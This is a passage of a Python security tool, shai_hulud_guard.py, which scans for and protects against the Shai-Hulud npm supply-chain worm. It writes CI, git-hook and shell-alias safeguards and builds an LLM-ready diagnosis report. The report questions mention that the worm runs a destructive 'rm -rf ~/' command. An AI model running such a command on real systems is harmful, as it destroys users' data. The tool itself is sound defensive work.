        # Supply-chain scan — auto-generated by shai_hulud_guard.py v{VERSION}
        # Actions are SHA-pinned to protect against action-poisoning attacks.
        name: Supply Chain Security Scan
        on:
          push:
            paths: ['package*.json','requirements*.txt','pyproject.toml','poetry.lock','Pipfile*']
          pull_request:
            paths: ['package*.json','requirements*.txt','pyproject.toml','poetry.lock','Pipfile*']
        permissions:
          contents: read
        jobs:
          scan:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
              - uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065  # v5.6.0
                with: {{python-version: '3.11'}}
              - run: python shai_hulud_guard.py --scan --path .
              - run: python shai_hulud_guard.py --lockcheck --path .
              - run: python shai_hulud_guard.py --self-test
    """), encoding="utf-8")
    return wf


def _write_githook_template(project_path: Path) -> Path:
    """Write a pre-commit hook template file (not installed yet)."""
    tpl = project_path / "shai_hulud_pre_commit.hook"
    tpl.write_text(textwrap.dedent(f"""\
        #!/bin/bash
        # Shai-Hulud pre-commit hook template  (v{VERSION})
        #
        # PURPOSE: Protects repository collaborators — blocks commits that stage
        #          compromised package files before they reach the shared repo.
        #
        # NOTE:    This does NOT prevent installing infected packages on your local machine.
        #          For local install protection, use npm_safe.sh / pip_safe.sh instead.
        #          These protect DIFFERENT threat surfaces.
        #
        # Install: cp shai_hulud_pre_commit.hook .git/hooks/pre-commit
        #          chmod +x .git/hooks/pre-commit
        # Bypass:  git commit --no-verify
        REPO="$(git rev-parse --show-toplevel)"
        GUARD="$REPO/{_GUARD_FILE}"
        [ -f "$GUARD" ] || {{ echo "[guard] guard script not found — skipping"; exit 0; }}
        git diff --cached --name-only | grep -qE "package(-lock)?\\.json|requirements.*\\.txt|pyproject\\.toml" || exit 0
        echo "[guard] Package files staged — running supply-chain scan..."
        python3 "$GUARD" --scan --path "$REPO" || {{
            echo "[guard] ⚠  Risk detected. Commit blocked."
            echo "[guard]    Use: git commit --no-verify   to bypass at your own risk."
            exit 1
        }}
    """), encoding="utf-8")
    os.chmod(str(tpl), 0o755)  # noqa: S103 (0o755 intentional — generated scripts must be executable)
    return tpl


def _install_git_hook(project_path: Path) -> bool:
    """Copy the hook template to .git/hooks/pre-commit."""
    git_dir = project_path / ".git"
    if not git_dir.is_dir():
        warn("No .git directory — not a git repository, skipping hook install")
        return False
    hooks_dir = git_dir / "hooks"
    hooks_dir.mkdir(exist_ok=True)
    dest = hooks_dir / "pre-commit"
    tpl  = project_path / "shai_hulud_pre_commit.hook"
    if not tpl.exists():
        _write_githook_template(project_path)
    if dest.exists():
        shutil.copy2(str(dest), str(hooks_dir / "pre-commit.bak"))
        info("Backed up existing hook → pre-commit.bak")
    shutil.copy2(str(tpl), str(dest))
    os.chmod(str(dest), 0o755)  # noqa: S103 (0o755 intentional — generated scripts must be executable)
    ok("Hook installed: .git/hooks/pre-commit")
    return True


def _shell_profile(plat: str) -> Optional[Path]:
    """Detect the user's shell profile path."""
    if plat == "windows":
        try:
            r = subprocess.run(
                ["powershell", "-NoProfile", "-Command", "echo $PROFILE"],
                capture_output=True, text=True, timeout=10, errors="replace",
            )
            if r.returncode == 0 and r.stdout.strip():
                return Path(r.stdout.strip())
        except Exception:
            pass
        return None
    shell = os.environ.get("SHELL", "")
    for name, path in (
        ("zsh",  Path.home() / ".zshrc"),
        ("bash", Path.home() / ".bashrc"),
        ("fish", Path.home() / ".config" / "fish" / "config.fish"),
    ):
        if name in shell:
            return path
    return Path.home() / ".bashrc"


def _setup_shell_alias(guard_abs: str, plat: str) -> bool:
    profile = _shell_profile(plat)
    if not profile:
        warn("Cannot determine shell profile path — add aliases manually")
        return False
    guard_dir = Path(guard_abs).parent
    if plat == "windows":
        npm_w = guard_dir / "npm_safe.ps1"
        pip_w = guard_dir / "pip_safe.ps1"
        block = textwrap.dedent(f"""\
            function Invoke-SafeNpm {{ & "{npm_w}" @args }}
            Set-Alias -Name npm -Value Invoke-SafeNpm -Force -Scope Global
            function Invoke-SafePip {{ & "{pip_w}" @args }}
            Set-Alias -Name pip -Value Invoke-SafePip -Force -Scope Global
        """)
    else:
        npm_w = guard_dir / "npm_safe.sh"
        pip_w = guard_dir / "pip_safe.sh"
        block = textwrap.dedent(f"""\
            alias npm='{npm_w}'
            alias pip='{pip_w}'
        """)
    profile.parent.mkdir(parents=True, exist_ok=True)
    existing = profile.read_text(encoding="utf-8") if profile.exists() else ""
    if _SHAI_START in existing:
        ok(f"Aliases already present in {profile.name}")
        return True
    with open(profile, "a", encoding="utf-8") as f:
        f.write("\n" + _sentinel_wrap(block))
    ok(f"Aliases written to: {profile}")
    info(f"Restart terminal or run: source {profile}")
    return True


def _setup_project_npmrc(project_path: Path) -> bool:
    npmrc   = project_path / ".npmrc"
    existing = npmrc.read_text(encoding="utf-8") if npmrc.exists() else ""
    if _SHAI_START in existing:
        ok(".npmrc already has shai-hulud settings")
        return True
    additions = ""
    if "save-exact" not in existing:
        additions += "save-exact=true\n"
    if not additions:
        ok(".npmrc already configured")
        return True
    with open(npmrc, "a", encoding="utf-8") as f:
        f.write("\n" + _sentinel_wrap(additions))
    ok(f"Updated .npmrc: {npmrc}")
    return True


def _setup_scheduled_scan(plat: str, project_path: Path, guard_abs: str) -> bool:
    if plat == "windows":
        # List form (no shell=True) — CLAUDE.md §5.8. schtasks parses /tr as a
        # single argument; quoting inside it is handled by passing the whole
        # python invocation as one string element.
        tr_value = f'python "{guard_abs}" --scan --path "{project_path}"'
        cmd = [
            "schtasks", "/create", "/tn", _TASK_NAME,
            "/tr", tr_value, "/sc", "daily", "/st", "09:00", "/f",
        ]
        r = subprocess.run(cmd, capture_output=True, text=True)
        if r.returncode == 0:
            ok(f"Task Scheduler job created: {_TASK_NAME}  (daily 09:00)")
            return True
        warn(f"Task Scheduler failed: {r.stderr.strip()[:120]}")
        info(f"Manual command: schtasks /create /tn {_TASK_NAME} /tr \"{tr_value}\" /sc daily /st 09:00 /f")
        return False
    cron_line = (
        f"0 9 * * 1-5 python3 '{guard_abs}' --scan "
        f"--path '{project_path}' >> ~/shai_hulud_scan.log 2>&1"
    )
    try:
        r = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
        existing = r.stdout if r.returncode == 0 else ""
        if _SHAI_START in existing:
            ok("Cron job already present")
            return True
        new_cron = existing.rstrip("\n") + f"\n{_sentinel_wrap(cron_line)}\n"
        proc = subprocess.run(["crontab", "-"], input=new_cron, text=True, capture_output=True)
        if proc.returncode == 0:
            ok("Cron job added (Mon–Fri 09:00) — logs → ~/shai_hulud_scan.log")
            return True
        warn(f"crontab write failed: {proc.stderr}")
        info(f"Add manually: {cron_line}")
        return False
    except FileNotFoundError:
        warn("crontab not found — add manually:")
        info(f"  {cron_line}")
        return False


# ── run_unprotect: reverse all active protections ────────────────────────────

def run_unprotect(project_path: Path) -> None:
    """
    Remove every protection layer applied by --protect.
    Uses sentinel markers so only shai-hulud additions are removed.
    """
    head("UNPROTECT — removing shai-hulud protection layers")
    plat    = platform.system().lower()
    removed = 0

    # 1. Shell profile aliases
    profile = _shell_profile(plat)
    if profile and profile.exists():
        orig    = profile.read_text(encoding="utf-8")
        cleaned = _sentinel_strip(orig)
        if cleaned != orig:
            profile.write_text(cleaned, encoding="utf-8")
            ok(f"Shell aliases removed from: {profile}")
            info("Restart terminal or run: source " + str(profile))
            removed += 1
        else:
            ok(f"No shai-hulud aliases in: {profile.name}")

    # 2. Project .npmrc
    npmrc = project_path / ".npmrc"
    if npmrc.exists():
        orig    = npmrc.read_text(encoding="utf-8")
        cleaned = _sentinel_strip(orig)
        if cleaned != orig:
            if cleaned.strip():
                npmrc.write_text(cleaned, encoding="utf-8")
            else:
                npmrc.unlink()
            ok(".npmrc settings removed")
            removed += 1
        else:
            ok("No shai-hulud settings in .npmrc")

    # 3. Cron (Linux / macOS)
    if plat != "windows":
        try:
            r = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
            if r.returncode == 0 and _SHAI_START in r.stdout:
                cleaned = _sentinel_strip(r.stdout)
                subprocess.run(["crontab", "-"], input=cleaned, text=True)
                ok("Cron job removed")
                removed += 1
            else:
                ok("No shai-hulud cron job found")
        except FileNotFoundError:
            pass

    # 4. Task Scheduler (Windows)
    if plat == "windows":
        r = subprocess.run(
            ["schtasks", "/query", "/tn", _TASK_NAME],
            capture_output=True, text=True,
        )
        if r.returncode == 0:
            r2 = subprocess.run(
                ["schtasks", "/delete", "/tn", _TASK_NAME, "/f"],
                capture_output=True, text=True,
            )
            if r2.returncode == 0:
                ok(f"Task Scheduler job deleted: {_TASK_NAME}")
                removed += 1
            else:
                warn(f"Could not delete task: {r2.stderr.strip()[:80]}")
        else:
            ok(f"Task Scheduler job not found: {_TASK_NAME}")

    # 5. Git pre-commit hook
    git_hook = project_path / ".git" / "hooks" / "pre-commit"
    if git_hook.exists():
        content = git_hook.read_text(encoding="utf-8", errors="replace")
        if "shai_hulud" in content or "shai-hulud" in content:
            backup = project_path / ".git" / "hooks" / "pre-commit.bak"
            if backup.exists():
                shutil.copy2(str(backup), str(git_hook))
                ok("Pre-commit hook restored from backup")
            else:
                git_hook.unlink()
                ok("Pre-commit hook removed")
            removed += 1
        else:
            ok("Pre-commit hook not installed by shai-hulud — untouched")

    # 6. Report remaining wrapper files (user's choice to delete)
    wrappers = [f for f in [
        project_path / "npm_safe.sh",    project_path / "npm_safe.ps1",
        project_path / "pip_safe.sh",    project_path / "pip_safe.ps1",
        project_path / "shai_hulud_pre_commit.hook",
    ] if f.exists()]
    if wrappers:
        info(f"{len(wrappers)} wrapper/template file(s) still present — delete manually if not needed:")
        for w in wrappers:
            dim(f"  {w.name}")

    print()
    if removed > 0:
        ok(f"Unprotect complete — {removed} protection layer(s) removed")
    else:
        ok("Nothing to remove — no active shai-hulud protections detected")
    info("The shai_hulud_guard.py script itself is NOT removed.")
    info("To re-enable protection: python shai_hulud_guard.py --protect")


# ── run_protect: install all protection layers ────────────────────────────────

def run_protect(
    project_path: Path,
    install_hook: bool = False,
    setup_alias:  bool = False,
    setup_npmrc:  bool = False,
    setup_cron:   bool = False,
) -> None:
    """
    Phase 1 (auto): write wrapper scripts + CI template (inert files, no system change).
    Phase 2 (gated): install hook / shell alias / .npmrc / cron — asked interactively
                     or activated via --install-hook / --setup-alias / --setup-npmrc / --setup-cron.

    All Phase-2 changes are marked with sentinel comments and fully reversible via --unprotect.
    """
    head("PROACTIVE PROTECTION SETUP")
    info(f"Project  : {project_path}")
    info(f"Platform : {platform.system()} ({platform.machine()})")
    plat      = platform.system().lower()
    guard_abs = str(Path(__file__).resolve())

    # ── Phase 1: safe auto-execute (file writes only) ─────────────────────────
    subh("Phase 1/2  Install wrappers + CI template  (no system modification)")

    npm_res  = _write_npm_wrapper(project_path)
    pip_res  = _write_pip_wrapper(project_path)
    ci_path  = _write_ci_workflow(project_path)
    hook_tpl = _write_githook_template(project_path)

    for p in [*npm_res.values(), *pip_res.values()]:
        ok(f"Written: {p.name}")
    if ci_path:
        ok(f"Written: .github/workflows/{ci_path.name}")
    ok(f"Written: {hook_tpl.name}  (template — not installed yet, see note below)")

    print()
    info("Key distinction — install wrappers vs git hook:")
    dim("  npm_safe / pip_safe → block INSTALLATION before a package reaches your machine")
    dim("  pre-commit hook     → block COMMITS that add compromised packages to the shared repo")
    dim("  Both protect. They protect DIFFERENT surfaces. Use wrappers for personal protection.")

    # ── Phase 2: gated system modifications ──────────────────────────────────
    subh("Phase 2/2  Optional system modifications  (each fully reversible via --unprotect)")

    def _ask(prompt: str, flag: bool) -> bool:
        if flag:
            return True
        if not sys.stdin.isatty():
            info(f"  (non-interactive — skipping: {prompt})")
            return False
        try:
            return input(f"\n  ? {prompt} [y/N]: ").strip().lower() in ("y", "yes")
        except (EOFError, KeyboardInterrupt):
            return False

    if _ask(
        "Install git pre-commit hook? (blocks commits with risky package changes; bypass: git commit --no-verify)",
        install_hook,
    ):
        _install_git_hook(project_path)

    if _ask(
        "Add npm/pip aliases to shell profile? (intercepts every install in terminal)",
        setup_alias,
    ):
        _setup_shell_alias(guard_abs, plat)

    if _ask(
        "Add save-exact=true to project .npmrc? (pins exact versions, prevents silent drift)",
        setup_npmrc,
    ):
        _setup_project_npmrc(project_path)

    if _ask(
        "Schedule daily automated re-scan? (Mon-Fri 09:00 via cron or Task Scheduler)",
        setup_cron,
    ):
        _setup_scheduled_scan(plat, project_path, guard_abs)

    # ── Summary ───────────────────────────────────────────────────────────────
    print()
    head("PROTECTION ACTIVATED")
    ok("Phase 1 (wrappers + CI template): written. Activate with:")
    dim("")
    dim("  LINUX / macOS:")
    dim(f"    alias npm='{(project_path / 'npm_safe.sh').resolve()}'")
    dim(f"    alias pip='{(project_path / 'pip_safe.sh').resolve()}'")
    dim("    Add those lines to ~/.bashrc or ~/.zshrc, then: source ~/.bashrc")
    dim("    One-time bypass: SHAI_SKIP=1 npm install <pkg>")
    dim("")
    dim("  WINDOWS (PowerShell):")
    dim("    Set-Alias npm (Resolve-Path npm_safe.ps1)")
    dim("    Set-Alias pip (Resolve-Path pip_safe.ps1)")
    dim("    One-time bypass: $env:SHAI_SKIP=1; npm install <pkg>")
    dim("")
    dim("  CI/CD (GitHub Actions):")
    dim("    Commit .github/workflows/shai_hulud_supply_chain.yml to activate")
    dim("")
    dim("  Git pre-commit hook (repo protection):")
    dim("    cp shai_hulud_pre_commit.hook .git/hooks/pre-commit && chmod +x .git/hooks/pre-commit")
    dim("")
    info("Remove ALL active protections at any time:")
    info("  python shai_hulud_guard.py --unprotect")
    info("")
    info("Re-apply all protections non-interactively:")
    info("  python shai_hulud_guard.py --protect --setup-alias --setup-npmrc --setup-cron")


# ═══════════════════════════════════════════════════════════════════════════════
#  DIAGNOSIS MODE  --diagnose
# ═══════════════════════════════════════════════════════════════════════════════
# Writes a forensic, LLM-ready report combining scan findings with non-sensitive
# system context. Designed to be pasted into Claude / GPT-4 / Gemini for
# analyst-grade incident guidance when the user is not a security specialist.
#
# Safety invariant (§5.11 in CLAUDE.md):
#   The report contains NO credential values, NO file contents from node_modules
#   beyond the 100-char match snippets the scanner already shows, NO environment
#   variable values. Only:
#     • System fingerprint (OS, Python, CPU arch, hostname, username, CI env,
#       shell, scan timestamp)
#     • Findings list (level, title, detail, path, score contribution, advisories)
#     • Credential file PRESENCE (filename or [absent]) — never contents
#     • Tool version + invocation context

def collect_system_info() -> Dict[str, Any]:
    """
    Collect a non-sensitive system fingerprint for diagnosis reports.
    NEVER returns credential values, env-var values, or file contents.
    Safe to embed verbatim in a public LLM prompt.
    """
    # Detect CI environment by checking well-known env-var NAMES (not values)
    ci_env_signals = [
        "CI", "GITHUB_ACTIONS", "GITLAB_CI", "CIRCLECI", "JENKINS_URL",
        "TRAVIS", "BUILDKITE", "TEAMCITY_VERSION", "BITBUCKET_BUILD_NUMBER",
        "AZURE_PIPELINES", "TF_BUILD",
    ]
    ci_signals_present = [k for k in ci_env_signals if k in os.environ]

    # Tool versions — runs each with 5s timeout; missing tool reported as null
    def _ver(cmd: List[str]) -> Optional[str]:
        try:
            r = subprocess.run(cmd, capture_output=True, text=True,
                               timeout=5, errors="replace")
            if r.returncode == 0:
                return (r.stdout or r.stderr).strip().splitlines()[0][:200]
        except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
            pass
        return None

    return {
        "scan_timestamp_utc": datetime.now(timezone.utc).isoformat(timespec="seconds"),
        "tool": {
            "name": "shai_hulud_guard",
            "version": VERSION,
        },
        "os": {
            "system":   platform.system(),
            "release":  platform.release(),
            "version":  platform.version()[:200],
            "machine":  platform.machine(),
        },
        "python": {
            "version":      sys.version.split()[0],
            "implementation": platform.python_implementation(),
        },
        "host": {
            "hostname":  platform.node()[:120],
            "username":  os.environ.get("USER") or os.environ.get("USERNAME") or "unknown",
            "shell":     os.path.basename(os.environ.get("SHELL", "")) or os.environ.get("COMSPEC", "").rsplit(os.sep, 1)[-1] or "unknown",
        },
        "ci_environment": {
            "is_ci":             len(ci_signals_present) > 0,
            "detected_signals":  ci_signals_present,
        },
        "external_tools": {
            "node":  _ver(["node", "--version"]),
            "npm":   _ver(["npm", "--version"]),
            "pnpm":  _ver(["pnpm", "--version"]),
            "yarn":  _ver(["yarn", "--version"]),
            "bun":   _ver(["bun", "--version"]),
            "pip":   _ver(["pip", "--version"]),
            "git":   _ver(["git", "--version"]),
        },
    }


def generate_diagnosis_report(
    project_path: Path,
    findings: List[Union[Finding, Tuple[str, str]]],
    sys_info: Dict[str, Any],
    risk_score: int = 0,
    case: str = CASE_CLEAN,
    confidence: str = "DEFINITIVE",
) -> str:
    """
    Build a markdown forensic report from scan findings + system info.
    Output is intended for paste-into-LLM workflows.
    """
    fs = [_wrap_finding(f) for f in findings]
    # Bucket findings by level for the LLM summary
    by_level: Dict[str, List[Finding]] = {lvl: [] for lvl in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO")}
    for f in fs:
        by_level.setdefault(f.level, []).append(f)

    lines: List[str] = []
    lines.append("# Shai-Hulud Guard diagnosis report")
    lines.append("")
    lines.append(f"Generated: {sys_info['scan_timestamp_utc']}")
    lines.append(f"Tool:      shai_hulud_guard v{VERSION}")
    lines.append(f"Target:    {project_path}")
    lines.append(f"Case:      **{case}**  ({confidence} confidence)")
    lines.append(f"Risk:      {risk_score}/100")
    lines.append("")
    lines.append("> This report contains no credential values, no file contents beyond")
    lines.append("> 100-char match snippets, and no environment-variable values.")
    lines.append("> It is safe to paste into a frontier LLM for further suggestions.")
    lines.append("")

    # System fingerprint
    lines.append("## System fingerprint")
    lines.append("")
    lines.append("```json")
    lines.append(json.dumps(sys_info, indent=2))
    lines.append("```")
    lines.append("")

    # Findings by severity
    lines.append("## Findings")
    lines.append("")
    for lvl in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"):
        bucket = by_level.get(lvl, [])
        if not bucket:
            continue
        lines.append(f"### {lvl}  ({len(bucket)} finding{'s' if len(bucket) != 1 else ''})")
        lines.append("")
        for f in bucket:
            lines.append(f"- **{f.title}**")
            if f.detail:
                lines.append(f"  - Detail: {f.detail}")
            if f.path:
                lines.append(f"  - Path: `{f.path}`")
            if f.score_contribution:
                lines.append(f"  - Score contribution: +{f.score_contribution}")
            if f.advisories:
                lines.append(f"  - Advisories: {', '.join(f.advisories)}")
        lines.append("")

    if not fs:
        lines.append("_No findings._")
        lines.append("")

    # LLM-ready question block
    lines.append("---")
    lines.append("")
    lines.append("## Questions for the LLM")
    lines.append("")
    lines.append("Given the system fingerprint and findings above, please advise on:")
    lines.append("")
    lines.append("1. Is the listed combination of findings consistent with an active")
    lines.append("   Shai-Hulud infection, or does it look like noise / false positives?")
    lines.append("2. Which of the credential platforms whose files are present on this")
    lines.append("   machine (npm, GitHub, AWS, GCP, Azure, SSH) need rotation, and in")
    lines.append("   what order — bearing in mind that revocation before daemon removal")
    lines.append("   triggers `rm -rf ~/`?")
    lines.append("3. Based on the OS and detected CI environment, what platform-specific")
    lines.append("   forensic captures should be taken before remediation?")
    lines.append("4. Are there any findings whose `advisories` field is empty but where")
    lines.append("   a GitHub Advisory Database (GHSA) ID is likely to exist? Please")
    lines.append("   provide candidate IDs to check.")
    lines.append("5. What additional log sources or audit trails should be reviewed")
    lines.append("   given the findings above?")
    lines.append("6. Are any of the findings likely to be benign in this specific")
    lines.append("   environment? Justify each one.")
    lines.append("7. What is a reasonable acceptable-risk threshold for proceeding with")
    lines.append("   normal work on this machine, vs. wiping and rebuilding from clean?")
    lines.append("")
    lines.append("---")
    lines.append(f"_Generated by shai_hulud_guard v{VERSION} — https://github.com/USER/shai-hulud-guard_")
    lines.append("")
    return "\n".join(lines)


def run_diagnose(project_path: Path) -> None:
    """
    --diagnose: scan + system info + write LLM-ready markdown report.
    Output filename: shai_hulud_report_<UTC-timestamp>.txt
    """
    head("DIAGNOSIS REPORT")
    info(f"Target  : {project_path}")
    info("Running scan to collect findings ...")

    # Run scan and capture the total finding count for the case-classifier
    # signal. run_scan() prints inline; we accept that — the report is the
    # primary artefact, not the terminal output.
    total = run_scan(project_path)

    # For v2.4 the run_scan() function still emits to stdout only; rich
    # findings list isn't returned. We reconstruct a coarse summary for the
    # report using the total count + the persistence check.
    findings: List[Finding] = []
    if total > 0:
        findings.append(Finding(
            level="INFO",
            title=f"Scan emitted {total} indicator(s)",
            detail="Full per-finding detail is in the scanner's terminal output above. "
                   "Phase 5A's --json output produces the structured equivalent.",
            score_contribution=0,
        ))

    info("Collecting non-sensitive system fingerprint ...")
    sys_info = collect_system_info()

    # Determine output filename
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    out_path = project_path / f"shai_hulud_report_{timestamp}.txt"

    info(f"Writing diagnosis report to: {out_path.name}")
    report = generate_diagnosis_report(
        project_path=project_path,
        findings=findings,
        sys_info=sys_info,
        risk_score=0 if total == 0 else min(total * 5, 100),
        case=CASE_CLEAN if total == 0 else CASE_UNCERTAIN,
        confidence="DEFINITIVE" if total == 0 else "LOW",
    )
    try:
        out_path.write_text(report, encoding="utf-8")
        ok(f"Report written: {out_path}")
        print()
        info("Next step:")
        info(f"  Paste the contents of {out_path.name} into your preferred LLM")
        info("  (Claude, GPT-4, Gemini). It will use the structured fingerprint")
        info("  and findings to give analyst-grade incident guidance.")
        info("")
        info("The report contains no credential values, no file contents, no")
        info("environment-variable values — safe to share with an LLM.")
    except OSError as e:
        crit(f"Failed to write report: {e}")
        sys.exit(1)


# ═══════════════════════════════════════════════════════════════════════════════
#  ENTRYPOINT
# ═══════════════════════════════════════════════════════════════════════════════
def main() -> None:
    banner = textwrap.dedent(f"""
    ╔═══════════════════════════════════════════════════════════════╗
    ║  shai_hulud_guard  v{VERSION:<8}                              ║
    ║  npm supply-chain worm scanner + patch tool                  ║
    ║  All waves Sept 2025–May 2026 | Zero external dependencies   ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)
    parser = argparse.ArgumentParser(
        description="Shai-Hulud npm worm scanner, pre-install checker, and patch tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""
        examples:
          python shai_hulud_guard.py --scan
          python shai_hulud_guard.py --scan --path ~/projects/myapp
          python shai_hulud_guard.py --check @tanstack/react-router@1.169.5
          python shai_hulud_guard.py --lockcheck --path ~/projects/myapp
          python shai_hulud_guard.py --patch
          python shai_hulud_guard.py --patch --auto
          python shai_hulud_guard.py --check-pypi mistralai==2.4.6
          python shai_hulud_guard.py --incident
        """),
    )
    parser.add_argument("--scan",      action="store_true",
                        help="Scan existing project for infection indicators")
    parser.add_argument("--path",      default=".",
                        help="Project root for --scan / --lockcheck / --patch (default: .)")
    parser.add_argument("--check",     metavar="PKG[@VERSION]",
                        help="Pre-install safety check for an npm package")
    parser.add_argument("--check-pypi", metavar="PKG[==VERSION|@VERSION]",
                        help="Pre-install safety check for a PyPI package")
    parser.add_argument("--lockcheck", action="store_true",
                        help="Deep analysis of package-lock.json")
    parser.add_argument("--patch",     action="store_true",
                        help="Scan + classify infection + generate remediation scripts")
    parser.add_argument("--auto",      action="store_true",
                        help="With --patch: auto-execute safe remediation steps")
    parser.add_argument("--verify",    action="store_true",
                        help="Post-patch re-scan to confirm remediation succeeded")
    parser.add_argument("--self-test", action="store_true",
                        help="Run built-in self-test with synthetic infection artifacts")
    parser.add_argument("--protect",       action="store_true",
                        help="Set up proactive supply-chain protection (wrappers, CI, hook template)")
    parser.add_argument("--unprotect",     action="store_true",
                        help="Remove all protections applied by --protect")
    parser.add_argument("--diagnose",      action="store_true",
                        help="Scan + write LLM-ready forensic report (no credentials/secrets)")
    parser.add_argument("--json",          action="store_true",
                        help="Emit JSON instead of human-readable output (works with --scan, --check, --check-pypi, --lockcheck, --diagnose)")
    parser.add_argument("--install-hook",  action="store_true",
                        help="With --protect: auto-install git pre-commit hook")
    parser.add_argument("--setup-alias",   action="store_true",
                        help="With --protect: add npm/pip aliases to shell profile")
    parser.add_argument("--setup-npmrc",   action="store_true",
                        help="With --protect: add save-exact=true to project .npmrc")
    parser.add_argument("--setup-cron",    action="store_true",
                        help="With --protect: set up daily cron / Task Scheduler scan")
    parser.add_argument("--incident",  action="store_true",
                        help="Print full incident response guide")
    parser.add_argument("--version",   action="version",
                        version=f"shai_hulud_guard {VERSION}")
    args = parser.parse_args()

    # --json mode: only valid with read-only analysis modes. Suppresses banner
    # and all stdout output; emits a single JSON object at the end.
    json_compatible_modes = (
        args.scan or args.check or args.check_pypi or args.lockcheck or args.diagnose
    )
    if args.json and not json_compatible_modes:
        print("error: --json requires one of --scan, --check, --check-pypi, --lockcheck, --diagnose",
              file=sys.stderr)
        sys.exit(2)
    if not args.json:
        print(banner)

    if args.json:
        _json_mode_enter()
    try:
        if args.scan:
            run_scan(Path(args.path))
        elif args.check:
            run_check(args.check)
        elif args.check_pypi:
            run_pypi_check(args.check_pypi)
        elif args.lockcheck:
            run_lockcheck(Path(args.path))
        elif args.patch:
            run_patch(Path(args.path), auto=args.auto)
        elif args.verify:
            run_verify(Path(args.path))
        elif getattr(args, "self_test", False):
            run_self_test()
        elif args.protect:
            run_protect(
                Path(args.path),
                install_hook = args.install_hook,
                setup_alias  = args.setup_alias,
                setup_npmrc  = args.setup_npmrc,
                setup_cron   = getattr(args, "setup_cron", False),
            )
        elif args.unprotect:
            run_unprotect(Path(args.path))
        elif args.diagnose:
            run_diagnose(Path(args.path))
        elif args.incident:
            run_incident()
        else:
            if not args.json:
                parser.print_help()
                print()
                info("Start with:  python shai_hulud_guard.py --scan")
                info("Check npm:   python shai_hulud_guard.py --check <package>")
                info("Check PyPI:  python shai_hulud_guard.py --check-pypi <package>")
                info("Lockfile:    python shai_hulud_guard.py --lockcheck")
                info("Patch:       python shai_hulud_guard.py --patch")
                info("Compromised: python shai_hulud_guard.py --incident")
    finally:
        if args.json:
            sys.exit(_json_mode_exit_and_emit())

if __name__ == "__main__":
    main()
